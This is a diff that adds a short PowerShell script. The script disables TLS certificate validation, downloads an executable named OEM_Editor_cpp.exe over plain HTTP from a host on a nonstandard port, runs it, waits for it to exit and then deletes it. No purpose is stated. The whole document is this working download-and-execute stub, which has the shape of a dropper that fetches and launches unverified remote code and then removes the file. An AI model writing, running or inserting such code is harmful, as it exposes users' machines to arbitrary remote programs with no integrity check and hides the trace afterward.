@@ -1,0 +1,8 @@
+$tempFile = "$env:TEMP\OEM_Editor_cpp.exe"
+$url = "http://hycxit.top:5244/d/%E8%87%AA%E5%88%B6%E8%BD%AF%E4%BB%B6/OEM_Editor_cpp.exe"
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+$client = New-Object System.Net.WebClient
+$client.DownloadFile($url, $tempFile)
+$proc = Start-Process -FilePath $tempFile -PassThru
+$proc.WaitForExit()
+Remove-Item $tempFile -Force
